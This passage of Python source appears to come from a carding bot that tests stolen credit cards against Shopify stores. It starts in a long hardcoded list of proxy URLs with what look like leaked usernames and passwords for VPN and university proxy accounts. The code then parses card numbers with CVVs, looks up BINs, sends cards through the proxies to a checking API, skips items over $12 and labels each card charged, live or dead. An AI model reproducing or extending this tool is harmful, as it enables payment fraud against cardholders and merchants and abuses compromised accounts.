    "http://bvmbsmie:shibby2511@uk3.cactussstp.com:8080",
    "http://hughmuir2:lisamarie11@pt1.cactussstp.com:81",
    "http://bvmbsmie:shibby2511@uk2.cactussstp.com:81",
    "http://purevpn0s2232045:hww8fqbr72j0@px380101.pointtoserver.com:10780",
    "http://hughmuir2:lisamarie11@uk2.cactussstp.com:81",
    "http://uncpjndo:w77Ebc0h2A@ro1.cactussstp.com:3129",
    "http://purevpn0s2232045:hww8fqbr72j0@px420602.pointtoserver.com:10780",
    "http://hughmuir2:lisamarie11@uk2.cactussstp.com:8080",
    "http://uncpjndo:w77Ebc0h2A@uk3.cactussstp.com:8080",
    "http://purevpn0s2232045:hww8fqbr72j0@px440401.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px490401.pointtoserver.com:10780",
    "http://uncpjndo:w77Ebc0h2A@uk2.cactussstp.com:81",
    "http://uncpjndo:w77Ebc0h2A@ru1.cactussstp.com:81",
    "http://uncpjndo:w77Ebc0h2A@uk2.cactussstp.com:3129",
    "http://uncpjndo:w77Ebc0h2A@uk3.cactussstp.com:3129",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px121001.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px014236.pointtoserver.com:10780",
    "http://uncpjndo:w77Ebc0h2A@uk3.cactussstp.com:81",
    "http://purevpn0s2232045:hww8fqbr72j0@px591203.pointtoserver.com:10780",
    "http://bvmbsmie:shibby2511@uk2.cactussstp.com:8080",
    "http://uncpjndo:w77Ebc0h2A@in1.cactussstp.com:3129",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@dk-cop.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@pl-tor.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@cz-pra.pvdata.host:8080",
    "http://purevpn0s8959450:abcd1234@px032004.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px1260303.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px016104.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px032004.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px270401.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px032004.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px270401.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px270401.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px032004.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px270401.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px014236.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px032002.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px032004.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px041201.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px180801.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px150902.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px180801.pointtoserver.com:10780",
    "http://506061324:enya07141013@authproxy.fju.edu.tw:3128",
    "http://jantawan.ban:jantawan.ban@proxy.sru.ac.th:8080",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px180801.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px180801.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px241102.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px032002.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px016104.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px591201.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px241102.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px121102.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px400408.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px150902.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px014004.pointtoserver.com:10780",
    "http://s6202052810029:78496978@202.28.17.8:8080",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px152201.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px152201.pointtoserver.com:10780",
    "http://6115103001019:1819900293950@proxy.sru.ac.th:8080",
    "http://purevpn0s12948370:e0q5xodo@px152201.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px241104.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px031901.pointtoserver.com:10780",
    "http://s5703051618246:ablahum775@202.28.17.5:8080",
    "http://s5802016810053:1549900215617@202.28.17.8:8080",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px150902.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ro-buk.pvdata.host:8080",
    "http://purevpn0s12948370:e0q5xodo@px150902.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ee-tal.pvdata.host:8080",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px520401.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px520401.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px520401.pointtoserver.com:10780",
    "http://64052511005:3820800334521@proxy.sru.ac.th:8080",
    "http://purevpn0s8959450:abcd1234@px380101.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@gr-ath.pvdata.host:8080",
    "http://purevpn0s8959450:abcd1234@px031901.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px520401.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ph-man.pvdata.host:8080",
    "http://purevpn0s8959450:abcd1234@px490401.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px121001.pointtoserver.com:10780",
    "http://s6103021621234:frank100258@202.28.17.5:8080",
    "http://s6304046610189:0802503473Za@202.28.17.5:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@se-sto.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@il-tel.pvdata.host:8080",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px380101.pointtoserver.com:10780",
    "http://songponp:neung1nakub@202.28.17.8:8080",
    "http://purevpn0s8959450:abcd1234@px410701.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px019603.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px019603.pointtoserver.com:10780",
    "http://s6003026810028:1720800122226@202.28.17.8:8080",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px331101.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px013302.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px241102.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ie-dub.pvdata.host:8080",
    "http://purevpn0s8959450:abcd1234@px490402.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px013401.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px241104.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px241104.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px490701.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px241102.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px051003.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px241102.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px013403.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px040706.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px040805.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px241104.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px022409.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px040706.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px013401.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px013403.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px400501.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px400501.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px031901.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px051003.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px019603.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px040805.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px490701.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px013403.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px420602.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px591203.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px121001.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px173003.pointtoserver.com:10780",
    "http://g10701005:j0i2m2@proxy.ttu.edu.tw:3128",
    "http://purevpn0s12948370:e0q5xodo@px591201.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px121001.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px015601.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px591201.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px470108.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px400408.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px591203.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px022507.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px043006.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px019603.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px015601.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px031901.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px420602.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px470108.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px331101.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px015601.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px591201.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px591203.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px410701.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px410701.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px015601.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px591203.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px331101.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px420602.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px410701.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px400501.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px022409.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px460403.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px380101.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px490401.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px460101.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px380101.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px460403.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@lt-sia.pvdata.host:8080",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px470108.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px490401.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px460403.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px420602.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px490402.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px460403.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px041202.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px591801.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px173003.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px490402.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px440401.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px022408.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px040706.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px460101.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px040805.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px591801.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px040706.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px041201.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px041202.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px490701.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px041201.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px013302.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px121102.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px040706.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px591801.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px460101.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px490701.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px440401.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px013302.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px121102.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px041201.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px040805.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px440401.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px022409.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px040706.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px041202.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px400408.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px022408.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px022409.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px591801.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px043006.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px022408.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px013302.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px051703.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px022408.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px440401.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px051703.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px043006.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px460101.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px1260303.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px400501.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px051003.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px051003.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px022505.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px023005.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px1260303.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px022505.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px022507.pointtoserver.com:10780",
    "http://purevpn0s7397024:6CU9ZvexLGTqpB@px1260303.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px023005.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px043006.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px051703.pointtoserver.com:10780",
    "http://purevpn0s8959450:abcd1234@px023005.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px022507.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px173003.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px022507.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px051703.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px1260303.pointtoserver.com:10780",
    "http://purevpn0s4046496:EaKmB51MEjO4ha@px1260303.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px022505.pointtoserver.com:10780",
    "http://purevpn0s14144597:smEwHlIyeRObx1@px173003.pointtoserver.com:10780",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nz-auc.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@th-ban.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080",
    "http://purevpn0s551451:9dpdlc2nfxgj@px023004.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px032004.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px014004.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px032002.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px014236.pointtoserver.com:10780",
]

def load_proxies():
    """Prefer proxy.txt if present & non-empty, else use HARDCODED_PROXIES baked into the bot."""
    out = []
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    if line.startswith('http://') or line.startswith('https://') or line.startswith('socks'):
                        out.append(line)
                    else:
                        parts = line.split(':')
                        if len(parts) >= 4:
                            host, port, user, passwd = parts[0], parts[1], parts[2], ':'.join(parts[3:])
                            out.append(f'http://{user}:{passwd}@{host}:{port}')
                        elif len(parts) == 2:
                            out.append(f'http://{parts[0]}:{parts[1]}')
                        else:
                            out.append(line)
    except Exception:
        out = []
    if not out:
        out = list(HARDCODED_PROXIES)
    seen = set()
    uniq = []
    for p in out:
        if p not in seen:
            seen.add(p)
            uniq.append(p)
    return uniq


def load_user_proxies(user_id):
    """Return user's personal proxies if set, else fall back to global pool."""
    data = load_json(USER_PROXY_FILE, {})
    user_proxies = data.get(str(user_id), [])
    return user_proxies if user_proxies else load_proxies()

def get_user_sites_sync(user_id):
    data = load_json(USER_SITES_FILE, {})
    return data.get(str(user_id), [])

async def add_user_site(user_id, site):
    data = load_json(USER_SITES_FILE, {})
    user_sites = data.get(str(user_id), [])
    if site not in user_sites:
        user_sites.append(site)
        data[str(user_id)] = user_sites
        save_json(USER_SITES_FILE, data)
        return True
    return False

async def remove_user_site(user_id, site):
    data = load_json(USER_SITES_FILE, {})
    user_sites = data.get(str(user_id), [])
    if site in user_sites:
        user_sites.remove(site)
        if user_sites:
            data[str(user_id)] = user_sites
        else:
            data.pop(str(user_id), None)
        save_json(USER_SITES_FILE, data)
        return True
    return False

async def clear_user_sites(user_id):
    data = load_json(USER_SITES_FILE, {})
    if str(user_id) in data:
        del data[str(user_id)]
        save_json(USER_SITES_FILE, data)
        return True
    return False

def get_checker_sites(user_id):
    user_sites = get_user_sites_sync(user_id)
    return user_sites if user_sites else load_sites()

# ============================================================
# CARD + BIN
# ============================================================
def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                data = await res.json(content_type=None)
                return (
                    data.get('brand', '-'),
                    data.get('type', '-'),
                    data.get('level', '-'),
                    data.get('bank', '-'),
                    data.get('country_name', '-'),
                    data.get('country_flag', '')
                )
    except:
        return '-', '-', '-', '-', '-', ''

# ============================================================
# CHECK CARD
# ============================================================
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

def is_dead_site_error(msg):
    if not msg:
        return True
    return any(x in str(msg).lower() for x in _DEAD_INDICATORS)

API_FAIL_COUNT = 0
API_FAIL_LOCK = asyncio.Lock()


async def check_card(card, site, proxy):
    """Robust Shopify CC check. Treats boolean/string Status correctly and classifies by Response body first."""
    global API_FAIL_COUNT
    max_retries = 3

    def _norm_status(val):
        if isinstance(val, bool):
            return val
        if val is None:
            return False
        s = str(val).strip().lower()
        if s in ("true", "1", "yes", "ok", "success", "approved", "charged", "live"):
            return True
        if s in ("false", "0", "no", "fail", "failed", "error", "dead", "declined"):
            return False
        # non-empty unknown string -> treat as soft-true so we can still parse Response
        return bool(s)

    for attempt in range(max_retries):
        try:
            parts = card.split("|")
            if len(parts) != 4:
                return {
                    "status": "Site Error",
                    "message": "Invalid card format",
                    "card": card,
                    "site": site,
                    "gateway": "Unknown",
                    "price": "-",
                    "retry": False,
                }

            if not site.startswith("http"):
                site = f"https://{site}"

            # encode proxy safely for query string
            from urllib.parse import quote
            proxy_q = quote(proxy or "", safe="")

            api_url = get_api()
            url = f"{api_url}?site={quote(site, safe='')}&cc={quote(card, safe='')}&proxy={proxy_q}"
            timeout = aiohttp.ClientTimeout(total=35)
            _connector = None
            _sess_kw = {"timeout": timeout}
            if proxy and proxy.startswith("http"):
                try:
                    _connector = ProxyConnector.from_url(proxy)
                    _sess_kw["connector"] = _connector
                except Exception:
                    pass
            async with aiohttp.ClientSession(**_sess_kw) as session:
                async with session.get(url) as resp:
                    http_code = resp.status
                    try:
                        raw = await resp.json(content_type=None)
                    except Exception:
                        txt = await resp.text()
                        raw = {"Response": txt[:300], "Status": False, "raw_http": http_code}

            if not isinstance(raw, dict):
                raw = {"Response": str(raw)[:300], "Status": False}

            # Flexible field extraction (different APIs use different keys)
            response_msg = str(
                raw.get("Response")
                or raw.get("response")
                or raw.get("message")
                or raw.get("Message")
                or raw.get("error")
                or raw.get("Error")
                or ""
            ).strip()
            price = raw.get("Price", raw.get("price", raw.get("amount", "-")))
            gate = (
                raw.get("Gateway")
                or raw.get("Gate")
                or raw.get("gateway")
                or raw.get("gate")
                or "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮"
            )
            status_raw = raw.get("Status", raw.get("status", raw.get("success", False)))
            api_status = _norm_status(status_raw)
            response_lower = response_msg.lower()

            # Dead Railway / missing deploy — cool this API host and retry another
            if "application not found" in response_lower or "application_not_found" in response_lower:
                await mark_api_fail(api_url, response_msg)
                if attempt < max_retries - 1:
                    await asyncio.sleep(0.6)
                    continue
                return {
                    "status": "Site Error",
                    "message": "Application not found (API host dead)",
                    "card": card,
                    "retry": True,
                    "gateway": gate,
                    "price": price,
                    "site": site,
                }


            # HTTP-level failure
            if http_code >= 500:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1.5)
                    continue
                return {
                    "status": "Site Error",
                    "message": f"API HTTP {http_code}",
                    "card": card,
                    "retry": True,
                    "gateway": gate,
                    "price": price,
                    "site": site,
                }

            SITE_DEAD_TRIGGERS = [
                "request timeout", "timeout", "connection failed", "connection reset",
                "connection refused", "timed out", "site error", "site dead",
                "cloudflare", "captcha_required", "invalid url", "error in 1st req",
                "access denied", "tlsv1 alert", "ssl routines", "could not resolve",
                "domain name not found", "name or service not known",
                "openssl ssl_connect", "empty reply from server", "httperror504",
                "http error", "unreachable", "ssl error", "502", "503", "504",
                "bad gateway", "service unavailable", "gateway timeout",
                "network error", "failed to detect product", "failed to create checkout",
                "failed to tokenize card", "failed to get proposal data",
                "submit rejected", "handle error", "http 404",
                "url rejected", "malformed input", "amount_too_small",
                "all products sold out", "no_session_token", "tokenize_fail",
                "proxy error", "429", "rate limit", "too many requests",
                "proxy connection", "proxy authentication", "tunnel connection failed",
                "application not found", "application_not_found", "app not found",
                "not found", "deploy not found", "no application", "404",
                "service unavailable", "railway", "vercel",
            ]

            is_rz = "razorpay" in str(gate).lower() or "rz" in str(gate).lower()
            if not is_rz:
                try:
                    price_raw = str(price).strip().replace("$", "").replace("₹", "").replace(",", "").strip()
                    match = re.search(r"(\d+\.?\d*)", price_raw)
                    price_value = float(match.group(1)) if match else 0.0
                    if price_value > 12:
                        return {
                            "status": "Site Error",
                            "message": f"Price ${price_value} > $12 (Skipped)",
                            "card": card,
                            "retry": True,
                            "gateway": gate,
                            "price": price,
                            "site": site,
                        }
                except Exception:
                    pass

            # Hard site / infra errors -> retry other site/proxy
            if any(x in response_lower for x in SITE_DEAD_TRIGGERS):
                async with API_FAIL_LOCK:
                    API_FAIL_COUNT += 1
                if attempt < max_retries - 1:
                    await asyncio.sleep(1.2)
                    continue
                return {
                    "status": "Site Error",
                    "message": (response_msg[:150] if response_msg else "Site Error"),
                    "card": card,
                    "retry": True,
                    "gateway": gate,
                    "price": price,
                    "site": site,
                }

            async with API_FAIL_LOCK:
                if API_FAIL_COUNT > 0:
                    API_FAIL_COUNT = 0

            # ---- CLASSIFY BY RESPONSE TEXT FIRST (most reliable) ----
            CHARGED_TRIGGERS = [
                "charged", "order completed", "order_placed", "order_paid",
                "insufficient_funds", "thank you", "payment successful",
                "payment_success", "captured", "your order is confirmed",
                "order confirmed", "successfully charged",
            ]
            APPROVED_TRIGGERS = [
                "otp_required", "3ds_required", "3d secure", "approved",
                "success", "invalid_cvv", "incorrect_cvv", "invalid_cvc",
                "incorrect_cvc", "incorrect_zip", "cvv mismatch", "cvc_check",
                "avs_mismatch", "do_not_honor" , "live", "authenticated",
            ]
            DEAD_TRIGGERS = [
                "card_declined", "card declined", "declined", "do not honor",
                "stolen_card", "lost_card", "pickup_card", "expired_card",
                "incorrect_number", "invalid_number", "invalid card",
                "fraudulent", "restricted_card", "card_not_supported",
                "generic_decline", "try_again_later", "processing_error",
                "card_velocity_exceeded", "call_issuer", "fraud_suspected",
            ]

            status_str = str(status_raw).strip().lower() if status_raw is not None else ""

            # Charged
            if status_str in ("charged", "captured", "paid") or any(x in response_lower for x in CHARGED_TRIGGERS):
                await mark_api_ok(api_url)
                return {
                    "status": "Charged",
                    "message": response_msg[:150] if response_msg else "Charged",
                    "card": card,
                    "site": site,
                    "gateway": gate,
                    "price": price,
                    "retry": False,
                }

            # Approved / Live
            if status_str in ("approved", "live", "success", "true", "1") or any(x in response_lower for x in APPROVED_TRIGGERS):
                await mark_api_ok(api_url)
                return {
                    "status": "Approved",
                    "message": response_msg[:150] if response_msg else "Approved",
                    "card": card,
                    "site": site,
                    "gateway": gate,
                    "price": price,
                    "retry": False,
                }

            # Dead / Declined
            if status_str in ("dead", "declined", "false", "0") or any(x in response_lower for x in DEAD_TRIGGERS):
                await mark_api_ok(api_url)
                return {
                    "status": "Dead",
                    "message": response_msg[:150] if response_msg else "CARD_DECLINED",
                    "card": card,
